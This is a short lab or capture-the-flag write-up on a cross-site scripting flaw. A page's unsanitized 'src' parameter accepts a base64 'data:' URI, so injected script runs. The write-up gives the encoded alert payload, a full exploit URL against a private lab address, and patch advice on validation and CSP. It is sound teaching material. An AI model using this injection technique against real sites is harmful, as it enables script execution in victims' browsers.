# Exploit: Data URL Injection via src Parameter

## Vulnerability
By replacing the `src` parameter in the URL with a `data:` URI scheme (which encodes a payload in Base64), it is possible to inject and execute JavaScript. 
This occurs because the application fails to validate or sanitize the `src` parameter, allowing arbitrary data, including potentially harmful scripts, to be loaded.

### Example
1. Original URL:
http://10.14.60.12/?page=media&src=nsa

2. Data URL Structure:
The Data URLs are composed of four parts:
- A prefix: `data:`
- A MIME type indicating the type of data (e.g., `text/html`)
- An optional `base64` token if the data is non-textual
- The encoded data itself

Format:
data:[<media-type>][;base64],<data>


3. Payload:
- MIME type: `text/html`
- Script to inject:
  ```html
  <script>alert('you got hacked')</script>
  ```
- Base64-encoded payload:
  ```
  PHNjcmlwdD5hbGVydCgneW91IGdvdCBoYWNrZWQgJyk8L3NjcmlwdD4=
  ```

4. Exploit URL:
Replace the `src` parameter in the URL:
http://10.14.60.12/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneW91IGdvdCBoYWNrZWQgJyk8L3NjcmlwdD4=


5. Result:
Injected script executes, displaying the alert message.

## Patch

### 1. Use HTTP-only Content Loading for Media
If the application dynamically loads media content (e.g., images or videos), ensure it does so via HTTP or HTTPS protocols. Avoid inline content, such as `data:` URIs, which can be exploited for XSS or other injections.

### 2. Server-Side Filtering
Sanitize and validate the `src` parameter on the server-side:
- Ensure only trusted URLs are allowed.
- Reject or sanitize `data:` URIs and other inline schemes.

### 3. Content Security Policy (CSP)
Implement a strong Content Security Policy to restrict the execution of unauthorized scripts or loading of untrusted resources.

### 4. Regular Testing
Regularly audit and test the application for potential vulnerabilities, including XSS and parameter-based exploits.
